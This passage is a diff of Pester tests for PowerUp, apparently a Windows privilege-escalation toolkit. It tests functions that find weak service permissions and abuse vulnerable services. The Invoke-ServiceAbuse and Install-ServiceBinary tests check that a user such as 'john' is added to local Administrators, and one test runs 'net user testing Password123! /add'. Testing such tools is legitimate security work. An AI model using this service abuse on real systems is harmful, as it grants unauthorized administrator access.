@@ -25,19 +25,59 @@ function Test-IsAdmin {
 
 ########################################################
 #
-# PowerUp helpers functions.
+# PowerUp helper functions.
 #
 ########################################################
 
-Describe 'Get-ModifiableFile' {
+Describe 'Get-ModifiablePath' {
 
-    It 'Should output a file path.' {
+    It 'Should output a file Path, Permissions, and IdentityReference in results.' {
         $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
         $Null | Out-File -FilePath $FilePath -Force
 
         try {
-            $Output = Get-ModifiableFile -Path $FilePath
-            $Output | Should Be $FilePath
+            $Output = Get-ModifiablePath -Path $FilePath | Select-Object -First 1
+            
+            if ($Output.PSObject.Properties.Name -notcontains 'ModifiablePath') {
+                Throw "Get-ModifiablePath result doesn't contain 'ModifiablePath' field."
+            }
+
+            if ($Output.PSObject.Properties.Name -notcontains 'Permissions') {
+                Throw "Get-ModifiablePath result doesn't contain 'Permissions' field."
+            }
+
+            if ($Output.PSObject.Properties.Name -notcontains 'IdentityReference') {
+                Throw "Get-ModifiablePath result doesn't contain 'IdentityReference' field."
+            }
+        }
+        finally {
+            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    It 'Should output the correct file path in results.' {
+        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
+        $Null | Out-File -FilePath $FilePath -Force
+
+        try {
+            $Output = Get-ModifiablePath -Path $FilePath | Select-Object -First 1
+            $Output.ModifiablePath | Should Be $FilePath
+        }
+        finally {
+            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    It 'Should return the proper permission set.' {
+        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
+        $Null | Out-File -FilePath $FilePath -Force
+
+        try {
+            $Output = Get-ModifiablePath -Path $FilePath | Select-Object -First 1
+
+            if ($Output.Permissions -notcontains 'WriteData/AddFile') {
+                Throw "Get-ModifiablePath result doesn't contain the proper permission set."
+            }
         }
         finally {
             $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
@@ -51,29 +91,353 @@ Describe 'Get-ModifiableFile' {
         $CmdPath = "'C:\Windows\System32\nonexistent.exe' -i '$FilePath'"
         
         try {
-            $Output = Get-ModifiableFile -Path $FilePath
-            $Output | Should Be $FilePath
+            $Output = Get-ModifiablePath -Path $FilePath | Select-Object -First 1
+            $Output.ModifiablePath | Should Be $FilePath
         }
         finally {
             $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
         }
     }
 
-    It 'Should return no results for a non-existent path.' {
+    It 'Should accept a path string over the pipeline.' {
         $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
+        $Null | Out-File -FilePath $FilePath -Force
 
-        $Output = Get-ModifiableFile -Path $FilePath
-        $Output | Should BeNullOrEmpty
+        try {
+            $Output = $FilePath | Get-ModifiablePath
+            $Output | Should Not BeNullOrEmpty
+        }
+        finally {
+            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
+        }
     }
 
-    It 'Should accept a Path over the pipeline.' {
+    It 'Should accept a file object over the pipeline.' {
         $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
+        $Null | Out-File -FilePath $FilePath -Force
 
-        $Output = $FilePath | Get-ModifiableFile
-        $Output | Should BeNullOrEmpty
+        try {
+            $Output = Get-ChildItem -Path $FilePath | Get-ModifiablePath
+            $Output | Should Not BeNullOrEmpty
+        }
+        finally {
+            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
+        }
     }
 }
 
+Describe 'Get-CurrentUserTokenGroupSid' {
+
+    if(-not $(Test-IsAdmin)) { 
+        Throw "'Get-CurrentUserTokenGroupSid' Pester test needs local administrator privileges."
+    }
+
+    It 'Should not throw.' {
+        {Get-CurrentUserTokenGroupSid} | Should Not Throw
+    }
+
+    It 'Should return SIDs and Attributes.' {
+        $Output = Get-CurrentUserTokenGroupSid | Select-Object -First 1
+
+        if ($Output.PSObject.Properties.Name -notcontains 'SID') {
+            Throw "Get-CurrentUserTokenGroupSid result doesn't contain 'SID' field."
+        }
+
+        if ($Output.PSObject.Properties.Name -notcontains 'Attributes') {
+            Throw "Get-CurrentUserTokenGroupSid result doesn't contain 'Attributes' field."
+        }
+    }
+
+    It 'Should return the local administrators group SID.' {
+        $CurrentUserSids = Get-CurrentUserTokenGroupSid | Select-Object -ExpandProperty SID
+
+        if($CurrentUserSids -notcontains 'S-1-5-32-544') {
+            Throw "Get-CurrentUserTokenGroupSid result doesn't contain local administrators 'S-1-5-32-544' sid"
+        }
+    }
+}
+
+Describe 'Add-ServiceDacl' {
+
+    if(-not $(Test-IsAdmin)) { 
+        Throw "'Add-ServiceDacl' Pester test needs local administrator privileges."
+    }
+
+    It 'Should not throw.' {
+        {Get-Service | Add-ServiceDacl} | Should Not Throw
+    }
+
+    It 'Should fail for a non-existent service.' {
+        $ServiceName = Get-RandomName
+        {$Result = Add-ServiceDacl -Name $ServiceName} | Should Throw
+    }
+
+    It 'Should accept a service name as a parameter argument.' {
+        $ServiceName = Get-Service | Select-Object -First 1 | Select-Object -ExpandProperty Name
+        $ServiceWithDacl = Add-ServiceDacl -Name $ServiceName
+
+        if(-not $ServiceWithDacl.Dacl) {
+            Throw "'Add-ServiceDacl' doesn't return a Dacl for a service passed as parameter."
+        }
+    }
+
+    It 'Should accept an array of service names as a parameter argument.' {
+        $ServiceNames = Get-Service | Select-Object -First 5 | Select-Object -ExpandProperty Name
+        $ServicesWithDacl = Add-ServiceDacl -Name $ServiceNames
+
+        if(-not $ServicesWithDacl.Dacl) {
+            Throw "'Add-ServiceDacl' doesn't return Dacls for an array of service names as a parameter."
+        }
+    }
+
+    It 'Should accept a service object on the pipeline.' {
+        $Service = Get-Service | Select-Object -First 1
+        $ServiceWithDacl = $Service | Add-ServiceDacl
+
+        if(-not $ServiceWithDacl.Dacl) {
+            Throw "'Add-ServiceDacl' doesn't return a Dacl for a service object on the pipeline."
+        }
+    }
+
+    It 'Should accept a service name on the pipeline.' {
+        $ServiceName = Get-Service | Select-Object -First 1 | Select-Object -ExpandProperty Name
+        $ServiceWithDacl = $ServiceName | Add-ServiceDacl
+
+        if(-not $ServiceWithDacl.Dacl) {
+            Throw "'Add-ServiceDacl' doesn't return a Dacl for a service name on the pipeline."
+        }
+    }
+
+    It 'Should accept multiple service objects on the pipeline.' {
+        $Services = Get-Service | Select-Object -First 5
+        $ServicesWithDacl = $Services | Add-ServiceDacl
+
+        if(-not $ServicesWithDacl.Dacl) {
+            Throw "'Add-ServiceDacl' doesn't return Dacls for multiple service objects on the pipeline."
+        }
+    }
+
+    It 'Should accept multiple service names on the pipeline.' {
+        $ServiceNames = Get-Service | Select-Object -First 5 | Select-Object -ExpandProperty Name
+        $ServicesWithDacl = $ServiceNames | Add-ServiceDacl
+
+        if(-not $ServicesWithDacl.Dacl) {
+            Throw "'Add-ServiceDacl' doesn't return Dacls for multiple service names on the pipeline."
+        }
+    }
+
+    It 'Should return a correct service Dacl.' {
+        $Service = Get-Service | Select-Object -First 1
+        $ServiceWithDacl = $Service | Add-ServiceDacl
+
+        # 'AllAccess' = [uint32]'0x000F01FF'
+        $Rights = $ServiceWithDacl.Dacl | Where-Object {$_.SecurityIdentifier -eq 'S-1-5-32-544'}
+        if(($Rights.AccessRights -band 0x000F01FF) -ne 0x000F01FF) {
+            Throw "'Add-ServiceDacl' doesn't return the correct service Dacl."
+        }
+    }
+}
+
+Describe 'Set-ServiceBinPath' {
+
+    if(-not $(Test-IsAdmin)) { 
+        Throw "'Set-ServiceBinPath' Pester test needs local administrator privileges."
+    }
+
+    It 'Should fail for a non-existent service.' {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+
+        $Result = $False
+        {$Result = Set-ServiceBinPath -Name $ServiceName -binPath $ServicePath} | Should Throw
+        $Result | Should Be $False
+    }
+
+    It 'Should throw with an empty binPath.' {
+        $ServiceName = Get-RandomName
+        {Set-ServiceBinPath -Name $ServiceName -binPath ''} | Should Throw
+    }
+
+    It 'Should correctly set a service binary path.' {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
+        Start-Sleep -Seconds 1
+
+        $Result = Set-ServiceBinPath -Name $ServiceName -binPath $ServicePath
+        $Result | Should Be $True
+        $ServiceDetails = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'"
+        $ServiceDetails.PathName | Should be $ServicePath
+
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
+    }
+
+    It 'Should accept a service name as a string on the pipeline.' {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
+        Start-Sleep -Seconds 1
+
+        $Result = $ServiceName | Set-ServiceBinPath -binPath $ServicePath
+        $Result | Should Be $True
+
+        $ServiceDetails = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'"
+        $ServiceDetails.PathName | Should be $ServicePath
+        
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
+    }
+
+    It 'Should accept a service object on the pipeline.' {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
+        Start-Sleep -Seconds 1
+
+        $Result = Get-Service $ServiceName | Set-ServiceBinPath -binPath $ServicePath
+        $Result | Should Be $True
+        
+        $ServiceDetails = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'"
+        $ServiceDetails.PathName | Should be $ServicePath
+        
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
+    }
+}
+
+
+Describe 'Test-ServiceDaclPermission' {
+
+    if(-not $(Test-IsAdmin)) { 
+        Throw "'Test-ServiceDaclPermission' Pester test needs local administrator privileges."
+    }
+
+    It 'Should fail for a non-existent service.' {
+        $ServiceName = Get-RandomName
+        {$Result = Test-ServiceDaclPermission -Name $ServiceName} | Should Throw
+    }
+
+    It 'Should throw with an empty name.' {
+        {Test-ServiceDaclPermission -Name ''} | Should Throw
+    }
+
+    It 'Should throw with an invalid permission parameter.' {
+        $ServiceName = Get-RandomName
+        {Test-ServiceDaclPermission -Name $ServiceName -Permissions 'nonexistent'} | Should Throw
+    }
+
+    It 'Should throw with an invalid permission set parameter.' {
+        $ServiceName = Get-RandomName
+        {Test-ServiceDaclPermission -Name $ServiceName -PermissionSet 'nonexistent'} | Should Throw
+    }
+
+    It 'Should succeed with an existing service.' {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+        
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
+        Start-Sleep -Seconds 1
+
+        $Result = Test-ServiceDaclPermission -Name $ServiceName
+        $Result | Should Not BeNullOrEmpty
+
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
+    }
+
+    It 'Should succeed with an existing service.' {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+        
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
+        Start-Sleep -Seconds 1
+        
+        $Result = Test-ServiceDaclPermission -Name $ServiceName
+        $Result | Should Not BeNullOrEmpty
+
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
+    }
+
+    It 'Should succeed with a permission parameter.' {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+        
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
+        Start-Sleep -Seconds 1
+
+        $Result = Test-ServiceDaclPermission -Name $ServiceName -Permissions 'AllAccess'
+        $Result | Should Not BeNullOrEmpty
+
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
+    }
+
+    It 'Should succeed with a permission set parameter.' {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+        
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
+        Start-Sleep -Seconds 1
+
+        $Result = Test-ServiceDaclPermission -Name $ServiceName -PermissionSet 'ChangeConfig'
+        $Result | Should Not BeNullOrEmpty
+
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
+    }
+
+    It 'Should accept a service name as a string on the pipeline.' {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+        
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
+        Start-Sleep -Seconds 1
+
+        $Result = $ServiceName | Test-ServiceDaclPermission
+        $Result | Should Not BeNullOrEmpty
+
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
+    }
+
+    It 'Should accept a service object on the pipeline.' {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+        
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
+        Start-Sleep -Seconds 1
+
+        $Result = Get-Service $ServiceName | Test-ServiceDaclPermission
+        $Result | Should Not BeNullOrEmpty
+
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
+    }
+
+    It "Should fail for an existing service due to insufficient DACL permissions." {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+        $UserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.value
+        
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
+        Start-Sleep -Seconds 1
+        
+        sc.exe sdset $ServiceName "D:(A;;CCDCSWRPWPDTLOCRSDRCWDWO;;;$UserSid)" | Should Match 'SUCCESS'
+        
+        {Test-ServiceDaclPermission -Name $ServiceName} | Should Throw
+
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
+    }
+    
+    It "Should succeed with for an existing service due to sufficient specific DACL permissions." {
+        $ServiceName = Get-RandomName
+        $ServicePath = 'C:\Program Files\service.exe'
+        $UserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.value
+        
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
+        Start-Sleep -Seconds 1
+        
+        sc.exe sdset $ServiceName "D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$UserSid)" | Should Match 'SUCCESS'
+
+        $Result = Test-ServiceDaclPermission -Name $ServiceName
+        $Result | Should Not BeNullOrEmpty
+
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
+    } 
+}
 
 ########################################################
 #
@@ -84,7 +448,7 @@ Describe 'Get-ModifiableFile' {
 Describe 'Get-ServiceUnquoted' {
 
     if(-not $(Test-IsAdmin)) { 
-        Throw "'Get-ServicePermission' Pester test needs local administrator privileges."
+        Throw "'Get-ServiceUnquoted' Pester test needs local administrator privileges."
     }
 
     It "Should not throw." {
@@ -94,13 +458,13 @@ Describe 'Get-ServiceUnquoted' {
     It 'Should return service with a space in an unquoted binPath.' {
 
         $ServiceName = Get-RandomName
-        $ServicePath = "C:\Program Files\service.exe"
+        $ServicePath = 'C:\Program Files\service.exe'
 
-        sc.exe create $ServiceName binPath= $ServicePath | Should Match "SUCCESS"
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
         Start-Sleep -Seconds 1
 
         $Output = Get-ServiceUnquoted | Where-Object { $_.ServiceName -eq $ServiceName }
-        sc.exe delete $ServiceName | Should Match "SUCCESS"
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
 
         $Output | Should Not BeNullOrEmpty
         $Output.ServiceName | Should Be $ServiceName
@@ -111,25 +475,25 @@ Describe 'Get-ServiceUnquoted' {
         $ServiceName = Get-RandomName
         $ServicePath = "'C:\Program Files\service.exe'"
 
-        sc.exe create $ServiceName binPath= $ServicePath | Should Match "SUCCESS"
+        sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
         Start-Sleep -Seconds 1
 
         $Output = Get-ServiceUnquoted | Where-Object { $_.ServiceName -eq $ServiceName }
-        sc.exe delete $ServiceName | Should Match "SUCCESS"
+        sc.exe delete $ServiceName | Should Match 'SUCCESS'
 
         $Output | Should BeNullOrEmpty
     }
 }
 
 
-Describe 'Get-ServiceFilePermission' {
+Describe 'Get-ModifiableServiceFile' {
 
     if(-not $(Test-IsAdmin)) { 
-        Throw "'Get-ServiceFilePermission' Pester test needs local administrator privileges."
+        Throw "'Get-ModifiableServiceFile ' Pester test needs local administrator privileges."
     }
 
     It 'Should not throw.' {
-        {Get-ServiceFilePermission} | Should Not Throw
+        {Get-ModifiableServiceFile} | Should Not Throw
     }
 
     It 'Should return a service with a modifiable service binary.' {
@@ -138,47 +502,85 @@ Describe 'Get-ServiceFilePermission' {
             $ServicePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())" + ".exe"
             $Null | Out-File -FilePath $ServicePath -Force
 
-            sc.exe create $ServiceName binPath= $ServicePath | Should Match "SUCCESS"
+            sc.exe create $ServiceName binPath= $ServicePath | Should Match 'SUCCESS'
 
-            $Output = Get-ServiceFilePermission | Where-Object { $_.ServiceName -eq $ServiceName }
-            sc.exe delete $ServiceName | Should Match "SUCCESS"
-            
-            $Output | Should Not BeNullOrEmpty
-            $Output.ServiceName | Should Be $ServiceName
-            $Output.Path | Should Be $ServicePath
+            $Output = Get-ModifiableServiceFile | Where-Object { $_.ServiceName -eq $ServiceName } | Select-Object -First 1
+
+            $Properties = $Output.PSObject.Properties | Select-Object -ExpandProperty Name
+            if ($Properties -notcontains 'ServiceName') {
+                Throw "Get-ModifiableServiceFile result doesn't contain 'ServiceName' field."
+            }
+            if ($Properties -notcontains 'Path') {
+                Throw "Get-ModifiableServiceFile result doesn't contain 'Path' field."
+            }
+            if ($Properties -notcontains 'ModifiableFile') {
+                Throw "Get-ModifiableServiceFile result doesn't contain 'ModifiableFile' field."
+            }
+            if ($Properties -notcontains 'ModifiableFilePermissions') {
+                Throw "Get-ModifiableServiceFile result doesn't contain 'ModifiableFilePermissions' field."
+            }
+            if ($Properties -notcontains 'ModifiableFileIdentityReference') {
+                Throw "Get-ModifiableServiceFile result doesn't contain 'ModifiableFileIdentityReference' field."
+            }
+            if ($Properties -notcontains 'StartName') {
+                Throw "Get-ModifiableServiceFile result doesn't contain 'StartName' field."
+            }
+            if ($Properties -notcontains 'AbuseFunction') {
+                Throw "Get-ModifiableServiceFile result doesn't contain 'AbuseFunction' field."
+            }
+            if ($Properties -notcontains 'CanRestart') {
+                Throw "Get-ModifiableServiceFile result doesn't contain 'CanRestart' field."
+            }
+
+            if($Output.Path -ne $ServicePath) {
+                Throw "Get-ModifiableServiceFile result doesn't return correct Path for a modifiable service file."
+            }
+
+            if($Output.ModifiableFile -ne $ServicePath) {
+                Throw "Get-ModifiableServiceFile result doesn't return correct ModifiableFile for a modifiable service file."
+            }
+
+            $Output.CanRestart | Should Be $True
+
+            sc.exe delete $ServiceName | Should Match 'SUCCESS'
         }
         finally {
             $Null = Remove-Item -Path $ServicePath -Force
         }
     }
-
-    It 'Should not return a service with a non-existent service binary.' {
-        $ServiceName = Get-RandomName
-        $ServicePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())" + ".exe"
-
-        sc.exe create $ServiceName binPath= $ServicePath | Should Match "SUCCESS"
-
-        $Output = Get-ServiceFilePermission | Where-Object { $_.ServiceName -eq $ServiceName }
-        sc.exe delete $ServiceName | Should Match "SUCCESS"
-
-        $Output | Should BeNullOrEmpty
-    }
 }
 
 
-Describe 'Get-ServicePermission' {
+Describe 'Get-ModifiableService' {
 
     if(-not $(Test-IsAdmin)) { 
-        Throw "'Get-ServicePermission' Pester test needs local administrator privileges."
+        Throw "'Get-ModifiableService' Pester test needs local administrator privileges."
     }
 
     It 'Should not throw.' {
-        {Get-ServicePermission} | Should Not Throw
+        {Get-ModifiableService} | Should Not Throw
     }
 
     It 'Should return a modifiable service.' {
-        $Output = Get-ServicePermission | Where-Object { $_.ServiceName -eq 'Dhcp'}
+        $Output = Get-ModifiableService | Where-Object { $_.ServiceName -eq 'Dhcp'} | Select-Object -First 1
         $Output | Should Not BeNullOrEmpty
+
+        $Properties = $Output.PSObject.Properties | Select-Object -ExpandProperty Name
+        if ($Properties -notcontains 'ServiceName') {
+            Throw "Get-ModifiableService result doesn't contain 'ServiceName' field."
+        }
+        if ($Properties -notcontains 'Path') {
+            Throw "Get-ModifiableService result doesn't contain 'Path' field."
+        }
+        if ($Properties -notcontains 'StartName') {
+            Throw "Get-ModifiableService result doesn't contain 'StartName' field."
+        }
+        if ($Properties -notcontains 'AbuseFunction') {
+            Throw "Get-ModifiableService result doesn't contain 'AbuseFunction' field."
+        }
+        if ($Properties -notcontains 'CanRestart') {
+            Throw "Get-ModifiableService result doesn't contain 'CanRestart' field."
+        }
     }
 }
 
@@ -186,17 +588,26 @@ Describe 'Get-ServicePermission' {
 Describe 'Get-ServiceDetail' {
 
     It 'Should return results for a valid service.' {
-        $Output = Get-ServiceDetail -ServiceName Dhcp
+        $Output = Get-ServiceDetail -Name 'Dhcp'
         $Output | Should Not BeNullOrEmpty
     }
 
-    It 'Should return not results for an invalid service.' {
-        $Output = Get-ServiceDetail -ServiceName NonExistent123
-        $Output | Should BeNullOrEmpty
+    It 'Should throw with an empty Name.' {
+        $ServiceName = Get-RandomName
+        {Get-ServiceDetail -Name ''} | Should Throw
+    }
+
+    It 'Should throw for an invalid service.' {
+        {Get-ServiceDetail -Name 'NonExistent123'} | Should Throw
     }
 
     It 'Should accept a service name on the pipeline.' {
-        $Output = "Dhcp" | Get-ServiceDetail
+        $Output = 'Dhcp' | Get-ServiceDetail
+        $Output | Should Not BeNullOrEmpty
+    }
+
+    It 'Should accept a service object on the pipeline.' {
+        $Output = Get-Service 'Dhcp' | Get-ServiceDetail
         $Output | Should Not BeNullOrEmpty
     }
 }
@@ -217,57 +628,97 @@ Describe 'Invoke-ServiceAbuse' {
 
     BeforeEach {
         $ServicePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())" + ".exe"
-        $Null = sc.exe create "PowerUpService" binPath= $ServicePath
+        $Null = sc.exe create 'PowerUpService' binPath= $ServicePath
     }
 
     AfterEach {
-        $Null = sc.exe delete "PowerUpService"
+        $Null = sc.exe delete 'PowerUpService'
         $Null = $(net user john /delete >$Null 2>&1)
     }
 
     It 'Should abuse a vulnerable service to add a local administrator with default options.' {
-        $Output = Invoke-ServiceAbuse -ServiceName "PowerUpService"
-        $Output.Command | Should Match "net"
+        $Output = Invoke-ServiceAbuse -Name 'PowerUpService'
+        $Output.Command | Should Match 'net'
 
-        if( -not ($(net localgroup Administrators) -match "john")) {
+        if( -not ($(net localgroup Administrators) -match 'john')) {
+            Throw "Local user 'john' not created."
+        }
+    }
+
+    It 'Should accept the -Force switch.' {
+        $Output = Invoke-ServiceAbuse -Name 'PowerUpService' -Force
+        $Output.Command | Should Match 'net'
+
+        if( -not ($(net localgroup Administrators) -match 'john')) {
             Throw "Local user 'john' not created."
         }
     }
 
     It 'Should accept a service name on the pipeline.' {
-        $Output = "PowerUpService" | Invoke-ServiceAbuse
-        $Output.Command | Should Match "net"
+        $Output = 'PowerUpService' | Invoke-ServiceAbuse
+        $Output.Command | Should Match 'net'
 
-        if( -not ($(net localgroup Administrators) -match "john")) {
+        if( -not ($(net localgroup Administrators) -match 'john')) {
+            Throw "Local user 'john' not created."
+        }
+    }
+
+    It 'Should accept a service object on the pipeline.' {
+        $Output = Get-Service 'PowerUpService' | Invoke-ServiceAbuse
+        $Output.Command | Should Match 'net'
+
+        if( -not ($(net localgroup Administrators) -match 'john')) {
             Throw "Local user 'john' not created."
         }
     }
 
     It 'User should not be created for a non-existent service.' {
-        $Output = Invoke-ServiceAbuse -ServiceName "NonExistentService456"
-        $Output.Command | Should Match "Not found"
+        {Invoke-ServiceAbuse -ServiceName 'NonExistentService456'} | Should Throw
 
-        if( ($(net localgroup Administrators) -match "john")) {
+        if( ($(net localgroup Administrators) -match 'john')) {
             Throw "Local user 'john' should not have been created for non-existent service."
         }
     }
 
     It 'Should accept custom user/password arguments.' {
-        $Output = Invoke-ServiceAbuse -ServiceName "PowerUpService" -Username PowerUp -Password 'PASSword123!'
-        $Output.Command | Should Match "net"
+        $Output = Invoke-ServiceAbuse -ServiceName 'PowerUpService' -Username 'PowerUp' -Password 'PASSword123!'
+        $Output.Command | Should Match 'net'
 
-        if( -not ($(net localgroup Administrators) -match "PowerUp")) {
+        if( -not ($(net localgroup Administrators) -match 'PowerUp')) {
             Throw "Local user 'PowerUp' not created."
         }
         $Null = $(net user PowerUp /delete >$Null 2>&1)
     }
 
+    It 'Should accept a credential object.' {
+        $Username = 'PowerUp123'
+        $Password = ConvertTo-SecureString 'PASSword123!' -AsPlaintext -Force 
+        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $Password
+
+        $Output = Invoke-ServiceAbuse -ServiceName 'PowerUpService' -Credential $Credential
+        $Output.Command | Should Match 'net'
+
+        if( -not ($(net localgroup Administrators) -match 'PowerUp')) {
+            Throw "Local user 'PowerUp' not created."
+        }
+        $Null = $(net user PowerUp123 /delete >$Null 2>&1)
+    }
+
+    It 'Should accept an alternate LocalGroup.' {
+        $Output = Invoke-ServiceAbuse -Name 'PowerUpService' -LocalGroup 'Guests'
+        $Output.Command | Should Match 'net'
+
+        if( -not ($(net localgroup Guests) -match 'john')) {
+            Throw "Local user 'john' not added to 'Guests'."
+        }
+    }
+
     It 'Should accept a custom command.' {
         $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
-        $Output = Invoke-ServiceAbuse -ServiceName "PowerUpService" -Command "net user testing Password123! /add"
+        $Output = Invoke-ServiceAbuse -ServiceName 'PowerUpService' -Command 'net user testing Password123! /add'
 
         if( -not ($(net user) -match "testing")) {
-            Throw "Custom command failed."
+            Throw 'Custom command failed.'
         }
         $Null = $(net user testing /delete >$Null 2>&1)
     }
@@ -283,13 +734,13 @@ Describe 'Install-ServiceBinary' {
     BeforeEach {
         $ServicePath = "$(Get-Location)\powerup.exe"
         $Null | Out-File -FilePath $ServicePath -Force
-        $Null = sc.exe create "PowerUpService" binPath= $ServicePath
+        $Null = sc.exe create 'PowerUpService' binPath= $ServicePath
     }
 
     AfterEach {
         try {
-            $Null = Invoke-ServiceStop -ServiceName PowerUpService
-            $Null = sc.exe delete "PowerUpService"
+            $Null = Stop-Service -Name PowerUpService -Force
+            $Null = sc.exe delete 'PowerUpService'
             $Null = $(net user john /delete >$Null 2>&1)
         }
         finally {
@@ -303,71 +754,132 @@ Describe 'Install-ServiceBinary' {
     }
 
     It 'Should abuse a vulnerable service binary to add a local administrator with default options.' {
+        $Output = Install-ServiceBinary -ServiceName 'PowerUpService'
+        $Output.Command | Should Match 'net'
 
-        $Output = Install-ServiceBinary -ServiceName "PowerUpService"
-        $Output.Command | Should Match "net"
-
-        $Null = Invoke-ServiceStart -ServiceName PowerUpService
+        $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
         Start-Sleep -Seconds 3
-        if( -not ($(net localgroup Administrators) -match "john")) {
+        if( -not ($(net localgroup Administrators) -match 'john')) {
             Throw "Local user 'john' not created."
         }
-        $Null = Invoke-ServiceStop -ServiceName PowerUpService
+        $Null = Stop-Service -Name PowerUpService -Force
 
         $Output = Restore-ServiceBinary -ServiceName PowerUpService
         "$(Get-Location)\powerup.exe.bak" | Should Not Exist
     }
 
-    It 'Should accept a service name on the pipeline.' {
+    It 'Should accept a service Name on the pipeline.' {
+        $Output = 'PowerUpService' | Install-ServiceBinary
+        $Output.Command | Should Match 'net'
 
-        $Output = "PowerUpService" | Install-ServiceBinary
-        $Output.Command | Should Match "net"
-
-        $Null = Invoke-ServiceStart -ServiceName PowerUpService
+        $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
         Start-Sleep -Seconds 3
-        if( -not ($(net localgroup Administrators) -match "john")) {
+        if( -not ($(net localgroup Administrators) -match 'john')) {
             Throw "Local user 'john' not created."
         }
-        $Null = Invoke-ServiceStop -ServiceName PowerUpService
+        $Null = Stop-Service -Name PowerUpService -Force
+
+        $Output = Restore-ServiceBinary -ServiceName PowerUpService
+        "$(Get-Location)\powerup.exe.bak" | Should Not Exist
+    }
+
+    It 'Should accept a service object on the pipeline.' {
+        $Output = Get-Service 'PowerUpService' | Install-ServiceBinary
+        $Output.Command | Should Match 'net'
+
+        $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 3
+        if( -not ($(net localgroup Administrators) -match 'john')) {
+            Throw "Local user 'john' not created."
+        }
+        $Null = Stop-Service -Name PowerUpService -Force
 
         $Output = Restore-ServiceBinary -ServiceName PowerUpService
         "$(Get-Location)\powerup.exe.bak" | Should Not Exist
     }
 
     It 'User should not be created for a non-existent service.' {
-        $Output = Install-ServiceBinary -ServiceName "NonExistentService456"
-        $Output.Command | Should Match "Not found"
+        {Install-ServiceBinary -ServiceName "NonExistentService456"} | Should Throw
+        
+        if( ($(net localgroup Administrators) -match 'john')) {
+            Throw "Local user 'john' should not have been created for non-existent service."
+        }
     }
 
     It 'Should accept custom user/password arguments.' {
-        $Output = Install-ServiceBinary -ServiceName "PowerUpService" -Username PowerUp -Password 'PASSword123!'
-        $Output.Command | Should Match "net"
+        try {
+            $Output = Install-ServiceBinary -ServiceName 'PowerUpService' -Username 'PowerUp' -Password 'PASSword123!'
+            $Output.Command | Should Match 'net'
 
-        $Null = Invoke-ServiceStart -ServiceName PowerUpService
-        Start-Sleep -Seconds 3
-        if( -not ($(net localgroup Administrators) -match "PowerUp")) {
-            Throw "Local user 'PowerUp' not created."
+            $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 3
